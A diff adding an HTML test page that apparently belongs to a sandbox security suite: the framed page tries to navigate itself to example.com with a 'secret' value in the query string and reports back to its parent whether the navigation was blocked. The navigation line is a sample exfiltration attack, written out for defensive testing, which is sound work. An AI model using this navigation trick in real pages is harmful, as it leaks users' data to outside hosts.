@@ -1,0 +1,17 @@
+<!doctype html>
+<html>
+  <body>
+    <p>Navigation attack: this frame tries to navigate itself to an external URL carrying data.</p>
+    <script>
+      // If the navigation succeeds this document is gone and "still-here" is never sent.
+      setTimeout(() => {
+        try {
+          location.href = 'https://example.com/spike-045-nav-exfil?d=secret';
+        } catch (e) {
+          parent.postMessage({ __spikeTest: true, kind: 'nav-threw', message: e.message }, '*');
+        }
+      }, 50);
+      setTimeout(() => parent.postMessage({ __spikeTest: true, kind: 'nav-still-here' }, '*'), 2500);
+    </script>
+  </body>
+</html>
